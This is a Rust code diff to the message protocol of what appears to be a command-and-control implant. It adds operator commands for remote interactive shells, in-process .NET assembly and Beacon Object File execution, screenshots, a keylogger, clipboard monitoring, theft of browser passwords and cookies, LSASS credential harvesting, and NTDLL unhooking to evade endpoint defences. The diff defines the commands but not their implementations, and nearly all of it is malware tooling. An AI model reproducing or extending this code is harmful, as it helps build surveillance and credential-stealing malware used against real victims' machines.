@@ -196,6 +196,43 @@ pub enum Message {
         reason: u8,
         evidence_hash: [u8; 32],
     },
+    /// Interactive shell output — an asynchronous event sent by the agent's
+    /// background reader thread whenever a shell session produces stdout or
+    /// stderr data.  Unlike `TaskResponse`, this is not correlated to a
+    /// specific task ID; it streams continuously until the shell session
+    /// is closed.  The server forwards these events to the operator's
+    /// console in real-time.
+    ShellOutput {
+        /// The session that produced this output.
+        session_id: u32,
+        /// UTF-8 text (lossy-decoded from raw bytes).
+        data: String,
+        /// Which stream the data came from.
+        stream: ShellStream,
+    },
+}
+
+/// Which stream a [`Message::ShellOutput`] event came from.
+#[derive(Serialize, Deserialize, Debug, Clone, Copy, PartialEq, Eq)]
+#[repr(u8)]
+pub enum ShellStream {
+    /// Standard output.
+    Stdout = 0,
+    /// Standard error.
+    Stderr = 1,
+}
+
+/// Metadata returned when a shell session is created or listed.
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct ShellInfo {
+    /// Unique session identifier (monotonically increasing).
+    pub session_id: u32,
+    /// Shell type (e.g. "cmd.exe", "/bin/sh").
+    pub shell_type: String,
+    /// Epoch timestamp (seconds) when the session was created.
+    pub created_at: u64,
+    /// Process ID of the child shell.
+    pub pid: u32,
 }
 
 /// A single child entry in a [`Message::P2pTopologyReport`].
@@ -395,19 +432,6 @@ pub enum Command {
         plugin_id: String,
         args: String,
     },
-    StartShell,
-    ShellInput {
-        session_id: String,
-        data: Vec<u8>,
-    },
-    ShellOutput {
-        session_id: String,
-    },
-    /// Close the PTY session identified by `session_id`, terminating the
-    /// child process and freeing the associated file descriptors.
-    CloseShell {
-        session_id: String,
-    },
     Shutdown,
     DiscoverNetwork,
     CaptureScreen,
@@ -589,6 +613,172 @@ pub enum Command {
     MeshSetCompartment {
         compartment: String,
     },
+
+    // ── In-process .NET assembly execution (Windows only) ──────────────────
+    /// Load and execute a .NET assembly entirely in-process using the CLR
+    /// hosting APIs (ICLRMetaHost → ICLRRuntimeHost).  Equivalent to
+    /// Cobalt Strike's `execute-assembly`.  The assembly bytes must be a
+    /// valid .NET PE (managed DLL or EXE).  Output is captured via pipe
+    /// redirection and returned as UTF-8 text.
+    ExecuteAssembly {
+        /// Raw bytes of the .NET assembly (PE/COFF with CLR header).
+        data: Vec<u8>,
+        /// Command-line arguments passed to the assembly entry point.
+        #[serde(default)]
+        args: Vec<String>,
+        /// Optional wall-clock timeout in seconds.  If the assembly does
+        /// not return within this period the CLR thread is terminated.
+        /// `None` means use a default (30 s).
+        #[serde(default)]
+        timeout_secs: Option<u64>,
+    },
+
+    // ── BOF / COFF loader (Windows only) ───────────────────────────────────
+    /// Execute a Beacon Object File (BOF) / COFF object file in-process.
+    /// Compatible with the public BOF ecosystem (trustedsec, CCob, etc.).
+    /// The COFF bytes must contain a `go` entry-point symbol.  External
+    /// symbols are resolved via the Beacon-compatible API (`DLL$Function`
+    /// pattern).  Output is captured via the BeaconOutput callback and
+    /// returned as UTF-8 text.
+    ExecuteBOF {
+        /// Raw bytes of the COFF object file (`.o` / `.obj`).
+        data: Vec<u8>,
+        /// Arguments packed as length-prefixed blobs and passed to the
+        /// `go(char* args, int len)` entry point.
+        #[serde(default)]
+        args: Vec<String>,
+        /// Optional wall-clock timeout in seconds.  If the BOF does not
+        /// return within this period the execution thread is terminated.
+        /// `None` means use a default (60 s).
+        #[serde(default)]
+        timeout_secs: Option<u64>,
+    },
+
+    // ── Interactive shell sessions ──────────────────────────────────────
+    /// Create a new interactive shell session.  Spawns a child process
+    /// (cmd.exe, /bin/sh, or a custom shell) with piped stdin/stdout/stderr.
+    /// A background reader thread streams output asynchronously via
+    /// [`Message::ShellOutput`].
+    CreateShell {
+        /// Optional path to the shell binary.  `None` uses the platform
+        /// default (`cmd.exe` on Windows, `/bin/sh` on Unix).
+        #[serde(default)]
+        shell_path: Option<String>,
+    },
+    /// Send input to an active shell session's stdin pipe.
+    ShellInput {
+        /// The session to send input to.
+        session_id: u32,
+        /// The text to write.  A newline is appended automatically if not
+        /// present.
+        data: String,
+    },
+    /// Close and clean up a shell session (terminate process, close pipes,
+    /// stop reader thread).
+    ShellClose {
+        /// The session to close.
+        session_id: u32,
+    },
+    /// List all active shell sessions with their metadata.
+    ShellList,
+    /// Resize the pseudo-terminal for a shell session (no-op on Windows
+    /// cmd.exe; sets TTY window size on Unix).
+    ShellResize {
+        /// The session to resize.
+        session_id: u32,
+        /// Terminal width in columns.
+        cols: u16,
+        /// Terminal height in rows.
+        rows: u16,
+    },
+
+    // ── Surveillance ────────────────────────────────────────────────────
+
+    /// Capture a screenshot of the specified monitor (or primary if `None`).
+    /// Returns base64-encoded PNG bytes in the task response.
+    Screenshot {
+        /// Monitor index.  `None` captures the primary display.
+        #[serde(default)]
+        monitor: Option<u32>,
+    },
+    /// Start the keylogger.  Keystrokes are buffered in an encrypted ring
+    /// buffer and can be retrieved with `KeyloggerDump`.
+    KeyloggerStart,
+    /// Dump the encrypted keylogger buffer.  Returns `nonce(12) || ciphertext`
+    /// containing the recorded keystroke entries.
+    KeyloggerDump {
+        /// If true, clear the buffer after reading.
+        #[serde(default)]
+        clear: bool,
+    },
+    /// Stop the keylogger and release the keyboard hook.
+    KeyloggerStop,
+    /// Start monitoring the clipboard for changes.  Clipboard content
+    /// snapshots are buffered in an encrypted ring buffer.
+    ClipboardMonitorStart {
+        /// Polling interval in milliseconds.  `None` uses the default (1 000 ms).
+        #[serde(default)]
+        interval_ms: Option<u64>,
+    },
+    /// Dump the encrypted clipboard monitor buffer.
+    ClipboardMonitorDump {
+        /// If true, clear the buffer after reading.
+        #[serde(default)]
+        clear: bool,
+    },
+    /// Stop the clipboard monitor.
+    ClipboardMonitorStop,
+    /// Perform a one-shot clipboard read.  Returns the current clipboard
+    /// text as a UTF-8 string.
+    ClipboardGet,
+
+    // ── Browser stored-data recovery (Windows) ─────────────────────────
+
+    /// Recover stored credentials and/or cookies from installed browsers.
+    /// Windows-only; handled by the `browser-data` feature.
+    /// Returns a JSON-encoded `BrowserDataResult` in the response payload.
+    BrowserData {
+        /// Which browser(s) to target.  `None` defaults to `BrowserType::All`.
+        #[serde(default)]
+        browser: Option<BrowserType>,
+        /// Which data category to collect.
+        data_type: BrowserDataType,
+    },
+
+    // ── LSASS credential harvesting (Windows only) ──────────────────────
+
+    /// Harvest credentials from LSASS process memory via incremental reading
+    /// and in-process parsing.  No dump file is created on disk.  Returns a
+    /// JSON-encoded credential list containing MSV (NT hashes), WDigest
+    /// (plaintext), Kerberos tickets, DPAPI backup keys, and DCC2 hashes.
+    HarvestLSASS,
+
+    // ── NTDLL unhooking (Windows) ──────────────────────────────────────
+
+    /// Re-fetch a clean copy of ntdll.dll from \KnownDlls (or disk fallback)
+    /// and overlay the .text section onto the in-memory (potentially hooked)
+    /// ntdll.  This is the fallback when Halo's Gate fails (all adjacent
+    /// syscall stubs are hooked).  Also callable on-demand by the operator.
+    UnhookNtdll,
+}
+
+/// Browser selector for the [`Command::BrowserData`] command.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum BrowserType {
+    Chrome,
+    Edge,
+    Firefox,
+    All,
+}
+
+/// Data category selector for the [`Command::BrowserData`] command.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum BrowserDataType {
+    Credentials,
+    Cookies,
+    All,
 }
 
 /// Errors produced by [`CryptoSession`].
